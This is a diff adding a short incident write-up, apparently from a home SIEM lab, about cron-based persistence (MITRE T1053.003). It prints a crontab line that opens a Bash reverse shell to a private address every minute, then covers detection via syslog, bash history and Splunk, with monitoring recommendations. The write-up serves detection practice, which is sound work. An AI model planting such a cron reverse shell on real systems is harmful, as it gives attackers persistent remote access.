@@ -1,0 +1,35 @@
+🎯 MITRE Technique: T1053.003 – Scheduled Task/Job: Cron
+
+📅 Date: 24/06/2025
+🖥️ Host: Ubuntu VM (SIEM)
+👤 User: lief
+
+🧪 Summary:
+A crontab entry was created by the attacker to maintain persistence using a Bash reverse shell triggered every minute.
+
+📜 Cron Entry:
+*/1 * * * * bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1'
+
+🔍 Detection:
+
+syslog showed cron trigger logs.
+
+.bash_history recorded the crontab -e command.
+
+Splunk queries identified both creation and execution of the malicious job.
+
+📸 Evidence:
+
+Screenshot of the cron job being set
+
+Reverse shell detection via /dev/tcp pattern
+
+.bash_history revealing command entry
+
+🛡️ Recommendation:
+
+Implement crontab monitoring alerts
+
+Restrict crontab usage via RBAC
+
+Monitor for scheduled jobs that use suspicious syntax or outbound TCP calls
